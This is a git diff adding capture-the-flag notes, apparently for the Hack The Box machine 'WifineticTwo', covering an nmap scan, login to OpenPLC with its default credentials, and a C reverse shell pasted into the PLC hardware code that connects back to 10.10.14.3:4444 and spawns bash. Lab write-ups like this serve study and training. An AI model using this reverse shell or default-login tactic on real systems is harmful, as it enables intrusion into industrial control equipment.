@@ -1095,3 +1095,85 @@ Impacket & RS
 
 * Get root flag from openfire admin console with malicious plugin
   * TBD
+
+## WifineticTwo
+
+### Reco
+
+#### nmap
+
+`nmap -sVC 10.10.11.7`
+
+* 22 SSH
+* 8080 HTTP-proxy
+  * Werkzeug 1.0.1
+  * Python 2.7.18
+  * /login
+  * set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.ZgVHRg.h0e1LesEXAA247FVabrGC3Co6K0
+
+#### website
+
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+* try default credentials for OpenPLC
+  * openplc:openplc
+  * IT WORKS
+    * we are inside dashboard
+      * Dashboard
+      * Programs
+      * Slave Devices
+      * Monitoring
+      * HW
+      * Users
+      * Settings
+      * Logout
+    * we could upload a RS via Programs upload or Users upload
+
+### Weaponisation & Exploitation
+
+* Upload via Programs and Users didnt work
+* lets modify Hardware Code box...
+  * Generate RS from revshells.com
+    * Headers:
+      * \#include \<stdio.h> #include \<sys/socket.h> #include \<sys/types.h> #include \<stdlib.h> #include \<unistd.h> #include \<netinet/in.h> #include \<arpa/inet.h>
+    * inside void updateCustomOut() {...}
+      *
+
+          ```
+          int port = 4444; 
+          struct sockaddr_in revsockaddr;
+
+          int sockt = socket(AF_INET, SOCK_STREAM, 0);
+          revsockaddr.sin_family = AF_INET;       
+          revsockaddr.sin_port = htons(port);
+          revsockaddr.sin_addr.s_addr = inet_addr("10.10.14.3");
+
+          connect(sockt, (struct sockaddr *) &revsockaddr, 
+          sizeof(revsockaddr));
+          dup2(sockt, 0);
+          dup2(sockt, 1);
+          dup2(sockt, 2);
+
+          char * const argv[] = {"/bin/bash", NULL};
+          execvp("/bin/bash", argv);
+
+          return 0; 
+          ```
+* Compile & Start PLC
+  * we obtained revshell, easily
+
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+### User flag
+
+`which python3`
+
+`python3 -c 'import pty;pty.spawn("/bin/bash")'`
+
+`cd root`
+
+`cat user.txt`
+
+### Root flag
+
+* TBD
